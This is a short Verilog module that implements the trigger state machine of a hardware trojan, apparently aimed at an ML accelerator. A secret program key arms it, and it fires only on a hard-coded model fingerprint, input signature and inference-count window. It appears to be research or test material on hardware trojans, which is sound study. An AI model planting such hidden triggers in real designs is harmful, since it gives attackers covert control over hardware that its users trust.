module trojan_trigger_fsm (
    input  wire        clk,
    input  wire        rst_n,
    input  wire        start,
    input  wire        program_en,
    input  wire [15:0] program_key,
    input  wire [15:0] model_fingerprint,
    input  wire [15:0] input_signature,
    input  wire [1:0]  attack_mode,
    output reg         trojan_armed,
    output wire        model_match,
    output wire        input_match,
    output wire        window_match,
    output wire        trigger_fire,
    output reg  [7:0]  infer_count
);
    localparam [15:0] PROGRAM_KEY              = 16'hC35A;
    localparam [15:0] TARGET_MODEL_FINGERPRINT = 16'd236;
    localparam [15:0] TARGET_INPUT_SIGNATURE   = 16'h5AC3;
    localparam [7:0]  ATTACK_WINDOW_START      = 8'd1;
    localparam [7:0]  ATTACK_WINDOW_END        = 8'd64;

    assign model_match  = (model_fingerprint == TARGET_MODEL_FINGERPRINT);
    assign input_match  = (input_signature == TARGET_INPUT_SIGNATURE);
    assign window_match = (infer_count >= ATTACK_WINDOW_START) &&
                          (infer_count <= ATTACK_WINDOW_END);
    assign trigger_fire = trojan_armed &&
                          (attack_mode != 2'd0) &&
                          model_match &&
                          input_match &&
                          window_match;

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trojan_armed <= 1'b0;
            infer_count  <= 8'd0;
        end else begin
            if (program_en && (program_key == PROGRAM_KEY)) begin
                trojan_armed <= 1'b1;
            end

            if (start) begin
                infer_count <= infer_count + 8'd1;
            end
        end
    end
endmodule
